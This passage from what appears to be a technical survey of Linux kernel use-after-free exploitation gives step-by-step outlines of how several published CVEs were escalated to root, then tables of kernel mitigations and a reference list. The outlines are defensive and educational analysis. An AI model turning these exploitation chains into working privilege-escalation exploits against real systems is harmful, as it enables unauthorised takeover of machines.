### 8.1 CVE-2021-4154: Filesystem UAF in cgroup

**Bug class:** Reference counting error in cgroup filesystem operations.

**Root cause:** The `cgroup_get_from_fd()` function in the cgroup subsystem could obtain a reference to a cgroup through a file descriptor, but under certain conditions during cgroup destruction, the reference could outlive the cgroup. When the cgroup was freed, the stale reference became a dangling pointer.

**Exploitation approach:**
- The freed cgroup object was replaced with a controlled object via heap spray
- The replacement object's fields were crafted to redirect code execution through function pointers in the cgroup operations table
- Combined with a KASLR leak, this provided arbitrary code execution in kernel context
- Used `commit_creds(prepare_kernel_cred(0))` to escalate to root

**Impact:** Local privilege escalation from unprivileged user. Affected kernel versions 5.1 through 5.15.

### 8.2 CVE-2022-2588: Netfilter `cls_route` Double-Free / UAF

**Bug class:** Double-free leading to UAF in the network traffic classifier `cls_route`.

**Root cause:** The `route4_change()` function in `net/sched/cls_route.c` could, under specific conditions during filter replacement, cause a filter object to be freed twice. When replacing a filter, the old filter was freed but could still be referenced through the route table's hash chain.

**Exploitation approach:**

The exploit (known as "DirtyCred variant" or "Zhenpeng Lin's technique") used the double-free to create a UAF on the `cls_route` filter object, then:

1. **Freed the filter object** (first free via the normal deletion path)
2. **Reclaimed the freed memory** with a controlled allocation (using `msg_msg` spray into the same kmalloc cache)
3. **Triggered the second free** which now freed the `msg_msg` that had replaced the filter
4. **Used the dangling msg_msg pointer** to build arbitrary read/write primitives
5. **Overwritten `modprobe_path`** to gain root execution

This CVE was notable for demonstrating the "DirtyCred" technique's applicability: rather than directly attacking cred structs, it established a pipeline of UAF -> arb read/write -> data overwrite for privilege escalation.

**Affected versions:** Linux kernel through 5.19. Patched by limiting `cls_route` filter operations.

### 8.3 CVE-2022-29582: io_uring Linked Timeout UAF

**Bug class:** Race condition between deferred work items causing dangling reference.

**Root cause:** As detailed in Section 1.5, a race between the completion of an `IORING_OP_TIMEOUT` request `T` and the timer firing for its linked `IORING_OP_LINK_TIMEOUT` `LT` could cause `LT` to be destroyed while `T` still held a reference to it through the `link_list`.

**Exploitation approach (Awarau and pql):**

This exploit is one of the most technically sophisticated published kernel exploits, demonstrating a **three-stage UAF escalation**:

**Stage 1: io_kiocb UAF -> io_kiocb replacement**

```
- Race T's flush completion with LT's timer to create dangling reference
- LT is freed, but T's link_list still points to LT's address
- Allocate LT' (an IORING_OP_TEE request) at LT's address
- LT' blocks in do_tee() reading from an empty pipe (stabilization!)
```

**Stage 2: io_kiocb confusion -> file refcount underflow**

```
- T's destruction walks the link_list and encounters LT' instead of LT
- Since LT' is not an active timeout, its refs are decremented incorrectly
- This releases a reference to LT'->splice.file_in (a pipe file)
- The pipe file's refcount is now 1 less than expected
```

**Stage 3: File UAF -> cross-cache to msg_msgseg -> tls_context leak and hijack**

```
- Wake up the pipe to resume LT' in do_tee(), which puts the file (refcount -> 0)
- The file is freed, but userspace still has an fd pointing to it
- Cross-cache: free the filp slab page, reallocate as kmalloc-512 with msg_msgseg
- Free the file again (via close(fd)) -> msg_msgseg UAF
- Replace msg_msgseg with tls_context objects
- Read msg_msgseg via msgrcv() -> leaks tls_context fields including sk_proto (KASLR leak)
- Overwrite tls_context via msgsnd() -> redirect getsockopt to controlled function
- Achieve arbitrary code execution -> commit_creds(prepare_kernel_cred(0))
```

**Target environment:** Google kCTF on Container-Optimized OS (nsjail, no unprivileged user namespaces).

### 8.4 CVE-2022-27666: esp6 Buffer Overflow with Cross-Cache

**Bug class:** Heap buffer overflow (not UAF directly, but uses identical exploitation techniques).

**Root cause:** The esp6 crypto module allocated an 8-page receiving buffer but accepted messages larger than 8 pages, creating a linear heap overflow into adjacent pages.

**Exploitation innovation:** This exploit by Xiaochen Zou demonstrated several novel techniques for page-level heap feng shui:

- **Noise mitigation:** Draining lower-order free lists and creating alternating free/used patterns at order-2 to prevent unwanted buddy merging interference with order-3 operations
- **Dual-phase leak:** Phase 1 used `user_key_payload` OOB read to leak `msg_msg->next` pointer; Phase 2 used `msg_msg` OOB read (via corrupted `m_ts` and redirected `next`) to leak `seq_operations` function pointers for KASLR
- **FUSE-based arbitrary write:** Stalled `copy_from_user` in `load_msg()` to modify `msg_msg->next` pointer, then resumed to write controlled data to `modprobe_path`
- **~90% reliability** on fresh Ubuntu Desktop 21.10 (4GB RAM, 2 CPUs)

### 8.5 CVE-2021-22555: Netfilter `xt_compat` Heap OOB Write

**Bug class:** Heap out-of-bounds write in Netfilter's compat layer.

**Exploitation:** Andy Nguyen's exploit used a 2-byte heap OOB write in `kmalloc-64` to corrupt a `msg_msg` header (specifically the `m_list.next` field), building arbitrary read/write primitives. This demonstrated that even tiny corruptions can be escalated through `msg_msg` manipulation:

```
2-byte OOB write -> msg_msg->m_list.next corruption
  -> Arbitrary free (unlink from corrupted queue)
  -> Heap spray replacement -> Arbitrary read via m_ts corruption
  -> Task list traversal to find current task
  -> Arbitrary write via msg_msg->next redirection
  -> Overwrite current->cred for root
```

### 8.6 Project Zero TIOCSPGRP (2021): PID Refcount Race

**Bug class:** Data race causing reference count skew (detailed in Sections 1.1 and 5.4).

**Key innovation:** Jann Horn's exploit escalated a refcount race on `struct pid` all the way to root through **page table manipulation**, without requiring any kernel address leak:

```
Refcount skew -> struct pid freed prematurely
  -> Page freed to buddy allocator
  -> Page reallocated as page table (PTEs)
  -> UAF increment modifies a PTE (sets R/W + Dirty bits)
  -> Attacker gains write access to read-only setuid binary mapping
  -> Shellcode injected into setuid binary
  -> Execute modified setuid binary -> root
```

This exploit is noteworthy for its minimal requirements: no information leak, no ROP chain, no instruction pointer hijack.

---

## 9. Mitigations and Defenses

### 9.1 Allocator Hardening

| Mitigation | Mechanism | Bypass Difficulty |
|------------|-----------|-------------------|
| `CONFIG_SLAB_FREELIST_HARDENED` | XOR-obfuscated freelist pointers | Requires cache random leak |
| `CONFIG_SLAB_FREELIST_RANDOM` | Randomized object order in new slabs | Statistical (spray harder) |
| `CONFIG_SHUFFLE_PAGE_ALLOCATOR` | Randomizes page allocator freelists | Increases spray requirements |
| `CONFIG_RANDOM_KMALLOC_CACHES` (6.6+) | Multiple copies of kmalloc caches, random selection | Multiplies spray cost by N |
| Slab virtual memory (proposed) | Each cache gets its own virtual address range | Would prevent cross-cache |
| `init_on_alloc` / `init_on_free` | Zero-fill objects on alloc/free | Prevents data leaks but not UAF |

### 9.2 Object-Level Protections

| Mitigation | Mechanism | Coverage |
|------------|-----------|----------|
| `CONFIG_SLAB_TYPESAFE_BY_RCU` | Defers slab page freeing until RCU GP | Type-stable objects only |
| `CONFIG_DEBUG_SLAB_LEAK` | Tracks allocations for leak detection | Debug only |
| `refcount_t` (vs `atomic_t`) | Saturates instead of wrapping on overflow/underflow | Prevents refcount to 0 via overflow |
| `KASAN` (KernelAddressSanitizer) | Quarantines freed objects, detects UAF | ~2x overhead, debug/fuzzing only |

### 9.3 Control Flow Integrity

| Mitigation | Mechanism | Bypass |
|------------|-----------|--------|
| SMEP / SMAP | Prevents kernel exec/access of user pages | Doesn't stop kernel ROP |
| KPTI | Separates kernel/user page tables | Prevents ret2user, not kernel UAF |
| `CONFIG_CFI_CLANG` | Checks indirect call targets match expected type | Data-only attacks bypass |
| Shadow Call Stack | Protects return addresses | Doesn't affect function pointers |

### 9.4 Memory Layout Defenses

| Mitigation | Mechanism | Effect on UAF |
|------------|-----------|---------------|
| KASLR | Randomizes kernel base address | Requires leak before code exec |
| FGKASLR | Per-function randomization | Requires per-function leak |
| `slab_nomerge` | Prevents slab cache merging | Reduces same-cache cross-type UAF |

### 9.5 Behavioral Mitigations

| Mitigation | Mechanism | Limitation |
|------------|-----------|------------|
| `panic_on_oops=1` | System reboots on kernel oops | Prevents oracle-based exploitation |
| `vm.unprivileged_userfaultfd=0` | Blocks userfaultfd for non-root | FUSE still available in user NS |
| Lockdown / seccomp | Restricts available syscalls | Limits spray/trigger primitives |
| `user.max_user_namespaces=0` | Blocks unprivileged user NS | Prevents FUSE, packet sockets |

### 9.6 Deterministic UAF Prevention (Research)

Jann Horn's proof-of-concept deterministic UAF mitigation (LSSNA 2020) explored reliably preventing all UAF accesses by tracking memory validity:

- **Concept:** Every memory access through a pointer is checked against allocation metadata to verify the memory is still allocated for the expected purpose
- **Cost:** 60-159% CPU overhead in kernel-heavy benchmarks, ~8% for userspace-heavy workloads
- **Limitation:** Cannot prevent all consequences of "object state confusion" -- a freed object's `union` members or RCU state transitions may allow type confusion even with UAF checks

The fundamental challenge is that UAF is one symptom of the broader problem of **object lifetime state confusion**. A complete solution requires either:
1. A memory-safe language (Rust in the kernel)
2. Comprehensive static analysis with lifetime annotations
3. Hardware-assisted memory tagging (ARM MTE, Intel LAM)

---

## 10. References

### Primary Sources

1. **Jann Horn (Project Zero)**, "How a simple Linux kernel memory corruption bug can lead to complete system compromise," October 2021. Analysis of TIOCSPGRP race and page table exploitation technique.
   - https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html

2. **Will Sroot (FizzBuzz101)**, "Reviving Exploits Against Cred Structs -- Six Byte Cross Cache Overflow to Leakless Data-Oriented Kernel Pwnage," August 2022. Cross-cache overflow against cred_jar.
   - https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html

3. **Awarau and pql**, "CVE-2022-29582: An io_uring vulnerability," August 2022. Three-stage UAF escalation through io_kiocb, file, and cross-cache to tls_context.
   - https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/

4. **D3v17 (Syst3m Failure)**, "Wall of Perdition: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel," August 2021. msg_msg exploitation toolkit.
   - https://syst3mfailure.io/wall-of-perdition/

5. **Xiaochen Zou and Zhiyun Qian**, "CVE-2022-27666: Exploit esp6 modules in Linux kernel," March 2022. Page-level heap feng shui and cross-cache with noise mitigation.
   - https://etenal.me/archives/1825

### Exploitation Techniques

6. **Will Sroot**, "CVE-2022-0185 -- Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers," January 2022. msg_msg arbitrary read/write technique.

7. **Alexander Popov**, "Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel," February 2021. msg_msg OOB read via m_ts corruption.

8. **Zhenpeng Lin et al.**, "DirtyCred: Escalating Privilege in Linux Kernel," BlackHat USA 2022. Cross-cache UAF against cred structures.

9. **Andy Nguyen**, "CVE-2021-22555: Turning \x00\x00 into 10000$," July 2021. Netfilter compat heap OOB write to msg_msg exploitation.

10. **Christoph Lameter**, "Slab Allocators in the Linux Kernel: SLAB, SLUB, SLOB," Linux Foundation, 2014. Allocator internals reference.

### Kernel Source References

11. Linux kernel SLUB allocator: `mm/slub.c`
12. Linux kernel buddy allocator: `mm/page_alloc.c`
13. struct cred: `include/linux/cred.h`
14. struct msg_msg: `include/linux/msg.h`, `ipc/msgutil.c`
15. struct file: `include/linux/fs.h`

### Mitigation Research

16. **Jann Horn**, "Mitigating Linux kernel memory corruption bugs," LSSNA 2020. Deterministic UAF prevention proof-of-concept.

17. **grsecurity**, "How AUTOSLAB Changes the Memory Unsafety Game," 2022. Discussion of slab isolation improvements.

18. **duasynt**, "Linux kernel heap feng shui in 2022," 2022. Comprehensive guide to heap manipulation including CONFIG_MEMCG_KMEM effects.
